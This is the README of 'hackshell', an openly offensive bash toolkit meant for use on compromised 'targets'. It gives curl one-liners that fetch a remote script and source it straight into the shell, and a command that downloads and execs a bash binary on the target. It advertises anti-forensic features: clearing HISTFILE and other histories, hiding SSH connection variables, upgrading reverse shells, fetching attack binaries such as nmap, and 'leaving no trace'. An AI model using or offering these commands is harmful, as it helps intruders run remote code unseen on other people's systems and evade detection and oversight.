# hackshell
Make BASH stealthy and hacker friendly with lots of bash functions

Usage:
```shell
 source <(curl -SsfL https://thc.org/hs)
```

```shell
 source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
```

Some features:
*  unsets HISTFILE, SSH_CONNECT, wget/redis/mysql/less-HISTORY, ...
*  Upgrates to PTY shell (if reverse shell)
*  Creates hacker-friendly shortcuts, bash-functions and aliases
*  Static binary download by simple `bin <command>` (e.g. `bin nmap`)
*  Does not write ANY data to the harddrive
*  Leaves no trace
 
![hackshell](https://github.com/user-attachments/assets/fe4e9f4c-d0f6-4886-8f2f-ef7e3f86b406)

It works best with bash. Download BASH if there is no bash on your target:
```shell
curl -obash -SsfL "https://bin.ajam.dev/$(uname -m)/bash" && chmod 700 bash && ./bash --version && exec ./bash -il
```
